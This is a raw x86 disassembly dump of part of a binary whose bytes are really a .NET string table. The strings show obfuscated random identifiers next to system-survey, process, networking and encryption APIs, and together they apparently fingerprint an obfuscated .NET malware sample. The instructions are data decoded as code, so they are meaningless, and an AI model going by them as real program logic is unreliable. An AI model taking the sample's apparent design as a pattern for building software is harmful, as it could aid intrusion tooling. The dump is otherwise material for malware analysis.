  408eb9:	65 70 74             	gs jo  0x408f30
  408ebc:	69 6f 6e 00 44 67 67 	imul   $0x67674400,0x6e(%edi),%ebp
  408ec3:	7a 66                	jp     0x408f2b
  408ec5:	65 4c                	gs dec %esp
  408ec7:	68 4e 45 7a 6e       	push   $0x6e7a454e
  408ecc:	00 4b 71             	add    %cl,0x71(%ebx)
  408ecf:	52                   	push   %edx
  408ed0:	4d                   	dec    %ebp
  408ed1:	54                   	push   %esp
  408ed2:	6b 53 59 69          	imul   $0x69,0x59(%ebx),%edx
  408ed6:	75 4a                	jne    0x408f22
  408ed8:	7a 6e                	jp     0x408f48
  408eda:	00 70 6f             	add    %dh,0x6f(%eax)
  408edd:	6b 46 43 52          	imul   $0x52,0x43(%esi),%eax
  408ee1:	49                   	dec    %ecx
  408ee2:	52                   	push   %edx
  408ee3:	7a 42                	jp     0x408f27
  408ee5:	6f                   	outsl  %ds:(%esi),(%dx)
  408ee6:	00 56 56             	add    %dl,0x56(%esi)
  408ee9:	71 43                	jno    0x408f2e
  408eeb:	68 4f 70 61 76       	push   $0x7661704f
  408ef0:	55                   	push   %ebp
  408ef1:	49                   	dec    %ecx
  408ef2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ef3:	00 48 6f             	add    %cl,0x6f(%eax)
  408ef6:	6d                   	insl   (%dx),%es:(%edi)
  408ef7:	73 52                	jae    0x408f4b
  408ef9:	58                   	pop    %eax
  408efa:	78 65                	js     0x408f61
  408efc:	4c                   	dec    %esp
  408efd:	6f                   	outsl  %ds:(%esi),(%dx)
  408efe:	00 72 59             	add    %dh,0x59(%edx)
  408f01:	4f                   	dec    %edi
  408f02:	43                   	inc    %ebx
  408f03:	50                   	push   %eax
  408f04:	79 6c                	jns    0x408f72
  408f06:	45                   	inc    %ebp
  408f07:	78 6a                	js     0x408f73
  408f09:	67 56                	addr16 push %esi
  408f0b:	52                   	push   %edx
  408f0c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f0d:	00 64 71 53          	add    %ah,0x53(%ecx,%esi,2)
  408f11:	6f                   	outsl  %ds:(%esi),(%dx)
  408f12:	6f                   	outsl  %ds:(%esi),(%dx)
  408f13:	44                   	inc    %esp
  408f14:	7a 4e                	jp     0x408f64
  408f16:	4f                   	dec    %edi
  408f17:	49                   	dec    %ecx
  408f18:	56                   	push   %esi
  408f19:	63 66 6f             	arpl   %esp,0x6f(%esi)
  408f1c:	00 49 6d             	add    %cl,0x6d(%ecx)
  408f1f:	61                   	popa
  408f20:	67 65 43             	addr16 gs inc %ebx
  408f23:	6f                   	outsl  %ds:(%esi),(%dx)
  408f24:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408f29:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f2b:	00 46 69             	add    %al,0x69(%esi)
  408f2e:	6c                   	insb   (%dx),%es:(%edi)
  408f2f:	65 49                	gs dec %ecx
  408f31:	6e                   	outsb  %ds:(%esi),(%dx)
  408f32:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f34:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408f38:	76 65                	jbe    0x408f9f
  408f3a:	49                   	dec    %ecx
  408f3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408f3c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f3e:	00 46 69             	add    %al,0x69(%esi)
  408f41:	6c                   	insb   (%dx),%es:(%edi)
  408f42:	65 53                	gs push %ebx
  408f44:	79 73                	jns    0x408fb9
  408f46:	74 65                	je     0x408fad
  408f48:	6d                   	insl   (%dx),%es:(%edi)
  408f49:	49                   	dec    %ecx
  408f4a:	6e                   	outsb  %ds:(%esi),(%dx)
  408f4b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f4d:	00 43 6f             	add    %al,0x6f(%ebx)
  408f50:	6d                   	insl   (%dx),%es:(%edi)
  408f51:	70 75                	jo     0x408fc8
  408f53:	74 65                	je     0x408fba
  408f55:	72 49                	jb     0x408fa0
  408f57:	6e                   	outsb  %ds:(%esi),(%dx)
  408f58:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f5a:	00 43 53             	add    %al,0x53(%ebx)
  408f5d:	68 61 72 70 41       	push   $0x41707261
  408f62:	72 67                	jb     0x408fcb
  408f64:	75 6d                	jne    0x408fd3
  408f66:	65 6e                	outsb  %gs:(%esi),(%dx)
  408f68:	74 49                	je     0x408fb3
  408f6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f6d:	00 73 65             	add    %dh,0x65(%ebx)
  408f70:	74 5f                	je     0x408fd1
  408f72:	53                   	push   %ebx
  408f73:	74 61                	je     0x408fd6
  408f75:	72 74                	jb     0x408feb
  408f77:	49                   	dec    %ecx
  408f78:	6e                   	outsb  %ds:(%esi),(%dx)
  408f79:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f7b:	00 50 72             	add    %dl,0x72(%eax)
  408f7e:	6f                   	outsl  %ds:(%esi),(%dx)
  408f7f:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f82:	73 53                	jae    0x408fd7
  408f84:	74 61                	je     0x408fe7
  408f86:	72 74                	jb     0x408ffc
  408f88:	49                   	dec    %ecx
  408f89:	6e                   	outsb  %ds:(%esi),(%dx)
  408f8a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408f8c:	00 59 6c             	add    %bl,0x6c(%ecx)
  408f8f:	65 47                	gs inc %edi
  408f91:	42                   	inc    %edx
  408f92:	6d                   	insl   (%dx),%es:(%edi)
  408f93:	53                   	push   %ebx
  408f94:	70 43                	jo     0x408fd9
  408f96:	4f                   	dec    %edi
  408f97:	43                   	inc    %ebx
  408f98:	56                   	push   %esi
  408f99:	6d                   	insl   (%dx),%es:(%edi)
  408f9a:	6f                   	outsl  %ds:(%esi),(%dx)
  408f9b:	00 6d 5a             	add    %ch,0x5a(%ebp)
  408f9e:	6c                   	insb   (%dx),%es:(%edi)
  408f9f:	68 58 6e 62 73       	push   $0x73626e58
  408fa4:	6d                   	insl   (%dx),%es:(%edi)
  408fa5:	6f                   	outsl  %ds:(%esi),(%dx)
  408fa6:	00 4e 5a             	add    %cl,0x5a(%esi)
  408fa9:	7a 57                	jp     0x409002
  408fab:	7a 4b                	jp     0x408ff8
  408fad:	43                   	inc    %ebx
  408fae:	7a 6d                	jp     0x40901d
  408fb0:	70 6f                	jo     0x409021
  408fb2:	00 54 62 50          	add    %dl,0x50(%edx,%eiz,2)
  408fb6:	75 78                	jne    0x409030
  408fb8:	6b 72 71 56          	imul   $0x56,0x71(%edx),%esi
  408fbc:	57                   	push   %edi
  408fbd:	6d                   	insl   (%dx),%es:(%edi)
  408fbe:	44                   	inc    %esp
  408fbf:	70 00                	jo     0x408fc1
  408fc1:	56                   	push   %esi
  408fc2:	73 53                	jae    0x409017
  408fc4:	54                   	push   %esp
  408fc5:	61                   	popa
  408fc6:	58                   	pop    %eax
  408fc7:	62 71 7a             	bound  %esi,0x7a(%ecx)
  408fca:	4f                   	dec    %edi
  408fcb:	4a                   	dec    %edx
  408fcc:	70 00                	jo     0x408fce
  408fce:	74 6b                	je     0x40903b
  408fd0:	59                   	pop    %ecx
  408fd1:	70 59                	jo     0x40902c
  408fd3:	77 52                	ja     0x409027
  408fd5:	73 67                	jae    0x40903e
  408fd7:	67 51                	addr16 push %ecx
  408fd9:	70 00                	jo     0x408fdb
  408fdb:	4b                   	dec    %ebx
  408fdc:	64 67 47             	fs addr16 inc %edi
  408fdf:	6f                   	outsl  %ds:(%esi),(%dx)
  408fe0:	54                   	push   %esp
  408fe1:	62 53 79             	bound  %edx,0x79(%ebx)
  408fe4:	54                   	push   %esp
  408fe5:	70 00                	jo     0x408fe7
  408fe7:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe8:	42                   	inc    %edx
  408fe9:	6c                   	insb   (%dx),%es:(%edi)
  408fea:	57                   	push   %edi
  408feb:	48                   	dec    %eax
  408fec:	46                   	inc    %esi
  408fed:	43                   	inc    %ebx
  408fee:	6d                   	insl   (%dx),%es:(%edi)
  408fef:	74 4f                	je     0x409040
  408ff1:	6e                   	outsb  %ds:(%esi),(%dx)
  408ff2:	56                   	push   %esi
  408ff3:	70 00                	jo     0x408ff5
  408ff5:	64 67 5a             	fs addr16 pop %edx
  408ff8:	56                   	push   %esi
  408ff9:	4b                   	dec    %ebx
  408ffa:	57                   	push   %edi
  408ffb:	6a 5a                	push   $0x5a
  408ffd:	4c                   	dec    %esp
  408ffe:	42                   	inc    %edx
  408fff:	70 76                	jo     0x409077
  409001:	4c                   	dec    %esp
  409002:	42                   	inc    %edx
  409003:	63 70 00             	arpl   %esi,0x0(%eax)
  409006:	53                   	push   %ebx
  409007:	6c                   	insb   (%dx),%es:(%edi)
  409008:	65 65 70 00          	gs gs jo 0x40900c
  40900c:	4d                   	dec    %ebp
  40900d:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  409014:	74 2e                	je     0x409044
  409016:	43                   	inc    %ebx
  409017:	53                   	push   %ebx
  409018:	68 61 72 70 00       	push   $0x707261
  40901d:	6a 76                	push   $0x76
  40901f:	4f                   	dec    %edi
  409020:	74 70                	je     0x409092
  409022:	42                   	inc    %edx
  409023:	57                   	push   %edi
  409024:	6c                   	insb   (%dx),%es:(%edi)
  409025:	47                   	inc    %edi
  409026:	4a                   	dec    %edx
  409027:	6d                   	insl   (%dx),%es:(%edi)
  409028:	76 79                	jbe    0x4090a3
  40902a:	59                   	pop    %ecx
  40902b:	78 70                	js     0x40909d
  40902d:	00 53 79             	add    %dl,0x79(%ebx)
  409030:	73 74                	jae    0x4090a6
  409032:	65 6d                	gs insl (%dx),%es:(%edi)
  409034:	2e 4c                	cs dec %esp
  409036:	69 6e 71 00 79 56 56 	imul   $0x56567900,0x71(%esi),%ebp
  40903d:	74 64                	je     0x4090a3
  40903f:	57                   	push   %edi
  409040:	6c                   	insb   (%dx),%es:(%edi)
  409041:	5a                   	pop    %edx
  409042:	58                   	pop    %eax
  409043:	73 68                	jae    0x4090ad
  409045:	6d                   	insl   (%dx),%es:(%edi)
  409046:	4e                   	dec    %esi
  409047:	6f                   	outsl  %ds:(%esi),(%dx)
  409048:	71 00                	jno    0x40904a
  40904a:	75 57                	jne    0x4090a3
  40904c:	78 47                	js     0x409095
  40904e:	57                   	push   %edi
  40904f:	67 54                	addr16 push %esp
  409051:	44                   	inc    %esp
  409052:	6d                   	insl   (%dx),%es:(%edi)
  409053:	4a                   	dec    %edx
  409054:	48                   	dec    %eax
  409055:	47                   	inc    %edi
  409056:	78 71                	js     0x4090c9
  409058:	00 65 45             	add    %ah,0x45(%ebp)
  40905b:	79 72                	jns    0x4090cf
  40905d:	73 65                	jae    0x4090c4
  40905f:	42                   	inc    %edx
  409060:	62 75 42             	bound  %esi,0x42(%ebp)
  409063:	5a                   	pop    %edx
  409064:	5a                   	pop    %edx
  409065:	56                   	push   %esi
  409066:	45                   	inc    %ebp
  409067:	72 00                	jb     0x409069
  409069:	41                   	inc    %ecx
  40906a:	51                   	push   %ecx
  40906b:	7a 66                	jp     0x4090d3
  40906d:	62 4b 65             	bound  %ecx,0x65(%ebx)
  409070:	5a                   	pop    %edx
  409071:	65 57                	gs push %edi
  409073:	72 00                	jb     0x409075
  409075:	43                   	inc    %ebx
  409076:	6c                   	insb   (%dx),%es:(%edi)
  409077:	65 61                	gs popa
  409079:	72 00                	jb     0x40907b
  40907b:	43                   	inc    %ebx
  40907c:	68 61 72 00 49       	push   $0x49007261
  409081:	6e                   	outsb  %ds:(%esi),(%dx)
  409082:	76 6f                	jbe    0x4090f3
  409084:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  409088:	6d                   	insl   (%dx),%es:(%edi)
  409089:	62 65 72             	bound  %esp,0x72(%ebp)
  40908c:	00 4d 44             	add    %cl,0x44(%ebp)
  40908f:	35 43 72 79 70       	xor    $0x70797243,%eax
  409094:	74 6f                	je     0x409105
  409096:	53                   	push   %ebx
  409097:	65 72 76             	gs jb  0x409110
  40909a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090a1:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  4090a8:	41 
  4090a9:	43                   	inc    %ebx
  4090aa:	72 79                	jb     0x409125
  4090ac:	70 74                	jo     0x409122
  4090ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4090af:	53                   	push   %ebx
  4090b0:	65 72 76             	gs jb  0x409129
  4090b3:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090ba:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4090c1:	73 
  4090c2:	43                   	inc    %ebx
  4090c3:	72 79                	jb     0x40913e
  4090c5:	70 74                	jo     0x40913b
  4090c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c8:	53                   	push   %ebx
  4090c9:	65 72 76             	gs jb  0x409142
  4090cc:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4090d3:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4090da:	72 
  4090db:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4090e2:	64 65 72 00          	fs gs jb 0x4090e6
  4090e6:	4d                   	dec    %ebp
  4090e7:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4090ee:	74 2e                	je     0x40911e
  4090f0:	43                   	inc    %ebx
  4090f1:	53                   	push   %ebx
  4090f2:	68 61 72 70 2e       	push   $0x2e707261
  4090f7:	52                   	push   %edx
  4090f8:	75 6e                	jne    0x409168
  4090fa:	74 69                	je     0x409165
  4090fc:	6d                   	insl   (%dx),%es:(%edi)
  4090fd:	65 42                	gs inc %edx
  4090ff:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  409106:	61                   	popa
  409107:	6c                   	insb   (%dx),%es:(%edi)
  409108:	6c                   	insb   (%dx),%es:(%edi)
  409109:	53                   	push   %ebx
  40910a:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  409111:	65 
  409112:	72 00                	jb     0x409114
  409114:	67 65 74 5f          	addr16 gs je 0x409177
  409118:	42                   	inc    %edx
  409119:	75 66                	jne    0x409181
  40911b:	66 65 72 00          	data16 gs jb 0x40911f
  40911f:	73 65                	jae    0x409186
  409121:	74 5f                	je     0x409182
  409123:	42                   	inc    %edx
  409124:	75 66                	jne    0x40918c
  409126:	66 65 72 00          	data16 gs jb 0x40912a
  40912a:	67 65 74 5f          	addr16 gs je 0x40918d
  40912e:	41                   	inc    %ecx
  40912f:	73 49                	jae    0x40917a
  409131:	6e                   	outsb  %ds:(%esi),(%dx)
  409132:	74 65                	je     0x409199
  409134:	67 65 72 00          	addr16 gs jb 0x409138
  409138:	73 65                	jae    0x40919f
  40913a:	74 5f                	je     0x40919b
  40913c:	41                   	inc    %ecx
  40913d:	73 49                	jae    0x409188
  40913f:	6e                   	outsb  %ds:(%esi),(%dx)
  409140:	74 65                	je     0x4091a7
  409142:	67 65 72 00          	addr16 gs jb 0x409146
  409146:	4d                   	dec    %ebp
  409147:	61                   	popa
  409148:	6e                   	outsb  %ds:(%esi),(%dx)
  409149:	61                   	popa
  40914a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40914d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40914f:	74 4f                	je     0x4091a0
  409151:	62 6a 65             	bound  %ebp,0x65(%edx)
  409154:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409158:	61                   	popa
  409159:	72 63                	jb     0x4091be
  40915b:	68 65 72 00 53       	push   $0x53007265
  409160:	65 73 73             	gs jae 0x4091d6
  409163:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40916a:	6e                   	outsb  %ds:(%esi),(%dx)
  40916b:	67 45                	addr16 inc %ebp
  40916d:	76 65                	jbe    0x4091d4
  40916f:	6e                   	outsb  %ds:(%esi),(%dx)
  409170:	74 48                	je     0x4091ba
  409172:	61                   	popa
  409173:	6e                   	outsb  %ds:(%esi),(%dx)
  409174:	64 6c                	fs insb (%dx),%es:(%edi)
  409176:	65 72 00             	gs jb  0x409179
  409179:	54                   	push   %esp
  40917a:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409181:	55                   	push   %ebp
  409182:	70 70                	jo     0x4091f4
  409184:	65 72 00             	gs jb  0x409187
  409187:	43                   	inc    %ebx
  409188:	75 72                	jne    0x4091fc
  40918a:	72 65                	jb     0x4091f1
  40918c:	6e                   	outsb  %ds:(%esi),(%dx)
  40918d:	74 55                	je     0x4091e4
  40918f:	73 65                	jae    0x4091f6
  409191:	72 00                	jb     0x409193
  409193:	53                   	push   %ebx
  409194:	74 72                	je     0x409208
  409196:	65 61                	gs popa
  409198:	6d                   	insl   (%dx),%es:(%edi)
  409199:	57                   	push   %edi
  40919a:	72 69                	jb     0x409205
  40919c:	74 65                	je     0x409203
  40919e:	72 00                	jb     0x4091a0
  4091a0:	54                   	push   %esp
  4091a1:	65 78 74             	gs js  0x409218
  4091a4:	57                   	push   %edi
  4091a5:	72 69                	jb     0x409210
  4091a7:	74 65                	je     0x40920e
  4091a9:	72 00                	jb     0x4091ab
  4091ab:	45                   	inc    %ebp
  4091ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ad:	74 65                	je     0x409214
  4091af:	72 00                	jb     0x4091b1
  4091b1:	42                   	inc    %edx
  4091b2:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  4091b9:	72 
  4091ba:	74 65                	je     0x409221
  4091bc:	72 00                	jb     0x4091be
  4091be:	54                   	push   %esp
  4091bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c0:	4c                   	dec    %esp
  4091c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4091c2:	77 65                	ja     0x409229
  4091c4:	72 00                	jb     0x4091c6
  4091c6:	49                   	dec    %ecx
  4091c7:	45                   	inc    %ebp
  4091c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091c9:	75 6d                	jne    0x409238
  4091cb:	65 72 61             	gs jb  0x40922f
  4091ce:	74 6f                	je     0x40923f
  4091d0:	72 00                	jb     0x4091d2
  4091d2:	4d                   	dec    %ebp
  4091d3:	61                   	popa
  4091d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d5:	61                   	popa
  4091d6:	67 65 6d             	gs insl (%dx),%es:(%di)
  4091d9:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091db:	74 4f                	je     0x40922c
  4091dd:	62 6a 65             	bound  %ebp,0x65(%edx)
  4091e0:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4091e4:	75 6d                	jne    0x409253
  4091e6:	65 72 61             	gs jb  0x40924a
  4091e9:	74 6f                	je     0x40925a
  4091eb:	72 00                	jb     0x4091ed
  4091ed:	53                   	push   %ebx
  4091ee:	79 73                	jns    0x409263
  4091f0:	74 65                	je     0x409257
  4091f2:	6d                   	insl   (%dx),%es:(%edi)
  4091f3:	2e 43                	cs inc %ebx
  4091f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f6:	6c                   	insb   (%dx),%es:(%edi)
  4091f7:	6c                   	insb   (%dx),%es:(%edi)
  4091f8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4091fe:	73 2e                	jae    0x40922e
  409200:	49                   	dec    %ecx
  409201:	45                   	inc    %ebp
  409202:	6e                   	outsb  %ds:(%esi),(%dx)
  409203:	75 6d                	jne    0x409272
  409205:	65 72 61             	gs jb  0x409269
  409208:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  40920c:	47                   	inc    %edi
  40920d:	65 74 45             	gs je  0x409255
  409210:	6e                   	outsb  %ds:(%esi),(%dx)
  409211:	75 6d                	jne    0x409280
  409213:	65 72 61             	gs jb  0x409277
  409216:	74 6f                	je     0x409287
  409218:	72 00                	jb     0x40921a
  40921a:	41                   	inc    %ecx
  40921b:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40921f:	61                   	popa
  409220:	74 6f                	je     0x409291
  409222:	72 00                	jb     0x409224
  409224:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  409229:	00 2e                	add    %ch,(%esi)
  40922b:	63 63 74             	arpl   %esp,0x74(%ebx)
  40922e:	6f                   	outsl  %ds:(%esi),(%dx)
  40922f:	72 00                	jb     0x409231
  409231:	4d                   	dec    %ebp
  409232:	6f                   	outsl  %ds:(%esi),(%dx)
  409233:	6e                   	outsb  %ds:(%esi),(%dx)
  409234:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  40923b:	65 
  40923c:	61                   	popa
  40923d:	74 65                	je     0x4092a4
  40923f:	44                   	inc    %esp
  409240:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409244:	70 74                	jo     0x4092ba
  409246:	6f                   	outsl  %ds:(%esi),(%dx)
  409247:	72 00                	jb     0x409249
  409249:	43                   	inc    %ebx
  40924a:	72 65                	jb     0x4092b1
  40924c:	61                   	popa
  40924d:	74 65                	je     0x4092b4
  40924f:	45                   	inc    %ebp
  409250:	6e                   	outsb  %ds:(%esi),(%dx)
  409251:	63 72 79             	arpl   %esi,0x79(%edx)
  409254:	70 74                	jo     0x4092ca
  409256:	6f                   	outsl  %ds:(%esi),(%dx)
  409257:	72 00                	jb     0x409259
  409259:	4a                   	dec    %edx
  40925a:	41                   	inc    %ecx
  40925b:	7a 72                	jp     0x4092cf
  40925d:	47                   	inc    %edi
  40925e:	6b 64 47 73 55       	imul   $0x55,0x73(%edi,%eax,2),%esp
  409263:	73 72                	jae    0x4092d7
  409265:	00 49 6e             	add    %cl,0x6e(%ecx)
  409268:	74 50                	je     0x4092ba
  40926a:	74 72                	je     0x4092de
  40926c:	00 59 55             	add    %bl,0x55(%ecx)
  40926f:	61                   	popa
  409270:	71 62                	jno    0x4092d4
  409272:	45                   	inc    %ebp
  409273:	64 4f                	fs dec %edi
  409275:	61                   	popa
  409276:	4c                   	dec    %esp
  409277:	43                   	inc    %ebx
  409278:	78 72                	js     0x4092ec
  40927a:	00 74 7a 78          	add    %dh,0x78(%edx,%edi,2)
  40927e:	66 4d                	dec    %bp
  409280:	71 74                	jno    0x4092f6
  409282:	51                   	push   %ecx
  409283:	78 72                	js     0x4092f7
  409285:	00 5a 6f             	add    %bl,0x6f(%edx)
  409288:	63 65 41             	arpl   %esp,0x41(%ebp)
  40928b:	52                   	push   %edx
  40928c:	52                   	push   %edx
  40928d:	41                   	inc    %ecx
  40928e:	4e                   	dec    %esi
  40928f:	58                   	pop    %eax
  409290:	79 41                	jns    0x4092d3
  409292:	73 00                	jae    0x409294
  409294:	45                   	inc    %ebp
  409295:	55                   	push   %ebp
  409296:	48                   	dec    %eax
  409297:	52                   	push   %edx
  409298:	71 49                	jno    0x4092e3
  40929a:	6f                   	outsl  %ds:(%esi),(%dx)
  40929b:	61                   	popa
  40929c:	66 47                	inc    %di
  40929e:	73 00                	jae    0x4092a0
  4092a0:	69 50 67 58 42 75 54 	imul   $0x54754258,0x67(%eax),%edx
  4092a7:	48                   	dec    %eax
  4092a8:	4b                   	dec    %ebx
  4092a9:	78 51                	js     0x4092fc
  4092ab:	4a                   	dec    %edx
  4092ac:	73 00                	jae    0x4092ae
  4092ae:	63 58 6e             	arpl   %ebx,0x6e(%eax)
  4092b1:	63 46 46             	arpl   %eax,0x46(%esi)
  4092b4:	6b 50 59 4a          	imul   $0x4a,0x59(%eax),%edx
  4092b8:	43                   	inc    %ebx
  4092b9:	58                   	pop    %eax
  4092ba:	4c                   	dec    %esp
  4092bb:	73 00                	jae    0x4092bd
  4092bd:	72 79                	jb     0x409338
  4092bf:	71 4b                	jno    0x40930c
  4092c1:	4b                   	dec    %ebx
  4092c2:	61                   	popa
  4092c3:	64 75 7a             	fs jne 0x409340
  4092c6:	74 5a                	je     0x409322
  4092c8:	54                   	push   %esp
  4092c9:	57                   	push   %edi
  4092ca:	73 00                	jae    0x4092cc
  4092cc:	53                   	push   %ebx
  4092cd:	79 73                	jns    0x409342
  4092cf:	74 65                	je     0x409336
  4092d1:	6d                   	insl   (%dx),%es:(%edi)
  4092d2:	2e 44                	cs inc %esp
  4092d4:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4092db:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4092e2:	72 6f                	jb     0x409353
  4092e4:	73 6f                	jae    0x409355
  4092e6:	66 74 2e             	data16 je 0x409317
  4092e9:	56                   	push   %esi
  4092ea:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4092f1:	73 69                	jae    0x40935c
  4092f3:	63 2e                	arpl   %ebp,(%esi)
  4092f5:	44                   	inc    %esp
  4092f6:	65 76 69             	gs jbe 0x409362
  4092f9:	63 65 73             	arpl   %esp,0x73(%ebp)
  4092fc:	00 53 79             	add    %dl,0x79(%ebx)
  4092ff:	73 74                	jae    0x409375
  409301:	65 6d                	gs insl (%dx),%es:(%edi)
  409303:	2e 52                	cs push %edx
  409305:	75 6e                	jne    0x409375
  409307:	74 69                	je     0x409372
  409309:	6d                   	insl   (%dx),%es:(%edi)
  40930a:	65 2e 49             	gs cs dec %ecx
  40930d:	6e                   	outsb  %ds:(%esi),(%dx)
  40930e:	74 65                	je     0x409375
  409310:	72 6f                	jb     0x409381
  409312:	70 53                	jo     0x409367
  409314:	65 72 76             	gs jb  0x40938d
  409317:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  40931e:	73 74                	jae    0x409394
  409320:	65 6d                	gs insl (%dx),%es:(%edi)
  409322:	2e 52                	cs push %edx
  409324:	75 6e                	jne    0x409394
  409326:	74 69                	je     0x409391
  409328:	6d                   	insl   (%dx),%es:(%edi)
  409329:	65 2e 43             	gs cs inc %ebx
  40932c:	6f                   	outsl  %ds:(%esi),(%dx)
  40932d:	6d                   	insl   (%dx),%es:(%edi)
  40932e:	70 69                	jo     0x409399
  409330:	6c                   	insb   (%dx),%es:(%edi)
  409331:	65 72 53             	gs jb  0x409387
  409334:	65 72 76             	gs jb  0x4093ad
  409337:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  40933e:	62 75 67             	bound  %esi,0x67(%ebp)
  409341:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409348:	65 
  409349:	73 00                	jae    0x40934b
  40934b:	71 43                	jno    0x409390
  40934d:	66 72 57             	data16 jb 0x4093a7
  409350:	4a                   	dec    %edx
  409351:	43                   	inc    %ebx
  409352:	50                   	push   %eax
  409353:	41                   	inc    %ecx
  409354:	54                   	push   %esp
  409355:	61                   	popa
  409356:	68 65 73 00 45       	push   $0x45007365
  40935b:	78 70                	js     0x4093cd
  40935d:	61                   	popa
  40935e:	6e                   	outsb  %ds:(%esi),(%dx)
  40935f:	64 45                	fs inc %ebp
  409361:	6e                   	outsb  %ds:(%esi),(%dx)
  409362:	76 69                	jbe    0x4093cd
  409364:	72 6f                	jb     0x4093d5
  409366:	6e                   	outsb  %ds:(%esi),(%dx)
  409367:	6d                   	insl   (%dx),%es:(%edi)
  409368:	65 6e                	outsb  %gs:(%esi),(%dx)
  40936a:	74 56                	je     0x4093c2
  40936c:	61                   	popa
  40936d:	72 69                	jb     0x4093d8
  40936f:	61                   	popa
  409370:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409374:	00 47 65             	add    %al,0x65(%edi)
  409377:	74 50                	je     0x4093c9
  409379:	72 6f                	jb     0x4093ea
  40937b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40937e:	73 65                	jae    0x4093e5
  409380:	73 00                	jae    0x409382
  409382:	47                   	inc    %edi
  409383:	65 74 48             	gs je  0x4093ce
  409386:	6f                   	outsl  %ds:(%esi),(%dx)
  409387:	73 74                	jae    0x4093fd
  409389:	41                   	inc    %ecx
  40938a:	64 64 72 65          	fs fs jb 0x4093f3
  40938e:	73 73                	jae    0x409403
  409390:	65 73 00             	gs jae 0x409393
  409393:	53                   	push   %ebx
  409394:	79 73                	jns    0x409409
  409396:	74 65                	je     0x4093fd
  409398:	6d                   	insl   (%dx),%es:(%edi)
  409399:	2e 53                	cs push %ebx
  40939b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40939f:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  4093a6:	70 
  4093a7:	74 6f                	je     0x409418
  4093a9:	67 72 61             	addr16 jb 0x40940d
  4093ac:	70 68                	jo     0x409416
  4093ae:	79 2e                	jns    0x4093de
  4093b0:	58                   	pop    %eax
  4093b1:	35 30 39 43 65       	xor    $0x65433930,%eax
  4093b6:	72 74                	jb     0x40942c
  4093b8:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4093bf:	73 00                	jae    0x4093c1
  4093c1:	52                   	push   %edx
  4093c2:	66 63 32             	arpl   %si,(%edx)
  4093c5:	38 39                	cmp    %bh,(%ecx)
  4093c7:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4093cb:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4093d2:	73 00                	jae    0x4093d4
